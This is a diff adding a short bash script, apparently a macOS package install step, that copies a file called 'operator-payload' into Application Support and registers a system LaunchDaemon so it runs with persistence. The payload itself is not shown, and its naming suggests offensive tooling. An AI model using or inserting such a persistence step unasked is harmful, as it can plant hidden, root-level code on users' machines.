@@ -1,0 +1,4 @@
+#!/bin/bash
+cp "files/operator-payload" "/Library/Application Support/"
+cp "files/com.simple.plist" "/Library/LaunchDaemons/com.simple.agent.plist"
+exit 0
